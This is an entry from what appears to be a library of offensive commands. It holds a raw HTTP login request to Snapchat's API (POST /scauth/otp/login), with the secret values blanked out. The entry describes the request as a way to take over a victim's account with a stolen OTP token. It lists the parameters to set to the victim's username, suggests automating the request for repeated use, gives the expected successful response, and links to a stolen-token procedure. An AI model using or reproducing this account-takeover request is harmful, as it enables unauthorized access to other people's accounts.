---
data: >-
  POST /scauth/otp/login HTTP/1.1

  Host: gcp.api.snapchat.com

  Connection: close

  Content-Length: 6213

  X-Snapchat-Client-Auth: ██████

  X-Snapchat-UUID: ████████

  User-Agent: Snapchat/10.78.1.0 ██████

  Accept: application/json

  Accept-Language: en-GB;q=1, en;q=0.9

  Content-Type: application/x-www-form-urlencoded; charset=utf-8

  Accept-Encoding: gzip, deflate


  application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
tags:
  - api-request
  - account-takeover
type: command
executor: http
platforms:
  - Web
id: 09e8ee15-35ae-4039-bc72-f8dfd5b1e333
created_at: '2025-12-11T06:10:40.165Z'
updated_at: '2025-12-11T06:10:40.165Z'
verified: false
validated: true
submitted: true
---
# snapchat-otp-login-request

## Command

```http
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 6213
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ████████
User-Agent: Snapchat/10.78.1.0 ██████
Accept: application/json
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip, deflate

application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
```

## Description

Performs a login request to Snapchat's API using a stolen OTP token and victim's username to achieve account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| token | OTP token from logout response | Yes |
| username | Set to victim's username | Yes |
| device_id | Device identifier | Yes |
| req_token | Request token | Yes |
| timestamp | Request timestamp | Yes |

## Examples

### Basic Usage

```http
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
... (with stolen token)
```

### Advanced Usage

Integrate into automation script for repeated use.

## Expected Output

HTTP/1.1 200 OK with JSON response confirming login, including updates_response with logged:true, victim's username and user_id.

## Related

- [[commands/snapchat-logout-otp-request]]
- [[procedures/Perform-Snapchat-Login-Using-Stolen-OTP-Token]]
